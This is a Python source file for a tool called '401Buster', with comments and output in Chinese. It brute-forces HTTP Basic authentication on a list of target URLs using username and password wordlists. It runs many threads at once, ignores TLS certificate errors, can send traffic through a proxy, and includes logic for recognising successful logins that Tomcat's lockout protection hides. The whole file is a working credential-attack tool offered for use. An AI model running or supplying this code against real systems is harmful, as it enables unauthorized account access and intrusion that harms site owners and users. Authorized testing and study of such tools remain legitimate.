import requests
from colorama import Fore, init
import pyfiglet
import threading
import argparse
from tqdm import tqdm
import re
import time

init(autoreset=True)
requests.packages.urllib3.disable_warnings()


class _401Basic_Buster:
    def __init__(self, file, threads, proxy, username_dict, password_dict):
        self.file = file
        with open(self.file, "r", encoding='utf-8') as file:
            self.urls = file.readlines()
        self.threads = threads
        self.proxy = {"http": proxy} if proxy else None
        with open(username_dict, "r", encoding='utf-8') as file:
            self.usernames = [line.strip() for line in file]
        with open(password_dict, "r", encoding='utf-8') as file:
            self.passwords = [line.strip() for line in file]
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Priority": "u=0, i",
        }
        self.threading_lock = threading.Lock()
        self.local_data = threading.local()  #创建线程局部存储对象(不与其他线程共享的变量)

    @staticmethod
    def banner():
        print(Fore.CYAN + pyfiglet.figlet_format("401Buster", font="standard"))

    def check_is_alive(self, url):
        try:
            check_response = requests.get(url.strip(), headers=self.headers, timeout=15)
            if not re.search(r"Basic", str(check_response.headers), re.IGNORECASE):
                with self.threading_lock:
                    self.urls.remove(url)
                    #print(f"该网站: {url.strip():<30} 不是http basic认证")
                    print(f"该网站不是http basic认证: {url.strip()} ")

        except:
            self.urls.remove(url)

    def brute_force(self, url, progress_bar):
        try:
            self.local_data.response_failure_count = 0
            for password in self.passwords:
                for username in self.usernames:
                    try:
                        response = requests.post(url.strip(), headers=self.headers,
                                                 auth=(username.strip(), password.strip()),
                                                 proxies=self.proxy, verify=False, timeout=20)
                        if self.proxy and self.local_data.response_failure_count >= 2:
                            time.sleep(5)  # 服务器限制爆破速率为每5秒1次
                        elif self.proxy is None and self.local_data.response_failure_count > 10:
                            time.sleep(5)

                    except Exception as e:
                        if e:
                            time.sleep(5)
                            self.local_data.response_failure_count += 1
                            continue

                    if response.status_code in (200, 302) and not re.search(
                            r"unauthorized|Invalid|Authorization required|Burp Suite", response.text, re.IGNORECASE) and not re.search(
                            r"Basic", str(response.headers), re.IGNORECASE):
                        with self.threading_lock:
                            print(
                                Fore.RED + f"爆破成功, url: {url.strip()} 账号: {username.strip()}  密码: {password.strip()}")
                        with self.threading_lock:
                            progress_bar.update(1)
                        return
                    elif "tomcat" in response.text and response.status_code==403 and re.search(r"Access Denied|you may have triggered the cross-site request forgery (CSRF) protection",response.text,re.IGNORECASE) and not re.search(r"only accessible from|on the same machine as Tomcat",response.text,re.IGNORECASE):  #有时候tomcat爆破成功但是由于爆破次数过多触发了保护机制导致不会返回200状态码而是返回403,但实际上账号密码是正确的
                        with self.threading_lock:
                            print(
                                Fore.RED + f"爆破成功请再次验证, url: {url.strip()} 账号: {username.strip()}  密码: {password.strip()}  由于tomcat的爆破保护机制直接登录可能无法成功需要换个ip登录")
                        with self.threading_lock:
                            progress_bar.update(1)
                        return


        except:
            pass

        finally:
            with self.threading_lock:
                progress_bar.update(1)

    def multiple_thread(self):
        for i in range(0, len(self.urls), self.threads):
            thread_list = []
            for url in self.urls[i:i + self.threads]:
                thread = threading.Thread(target=self.check_is_alive, args=(url,))
                thread_list.append(thread)
                thread.start()
            for thread in thread_list:
                thread.join()

        with tqdm(total=len(self.urls), desc="进度", unit="url") as progress_bar:

            for i in range(0, len(self.urls), self.threads):
                thread_list = []
                for url in self.urls[i:i + self.threads]:
                    thread = threading.Thread(target=self.brute_force, args=(url, progress_bar))
                    thread_list.append(thread)
                    thread.start()
                    
                for thread in thread_list:
                    thread.join()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", dest="file", help="指定一个包含多个url的文件", required=True)
    parser.add_argument("-t", "--threads", dest="threads", help="设置线程数,默认为1个线程", type=int, default=1,
                        required=False)
    parser.add_argument("--proxy", dest="proxy",
                        help="设置代理,例如: --proxy=http://127.0.0.1:8080",
                        required=False)
    parser.add_argument("-u", dest="username_dict", help="指定一个用户名字典", required=True)
    parser.add_argument("-p", dest="password_dict", help="指定一个密码字典", required=True)
    args = parser.parse_args()
    _401Basic_buster = _401Basic_Buster(args.file, args.threads, args.proxy, args.username_dict, args.password_dict)
    _401Basic_buster.banner()
    _401Basic_buster.multiple_thread()


if __name__ == "__main__":
    main()
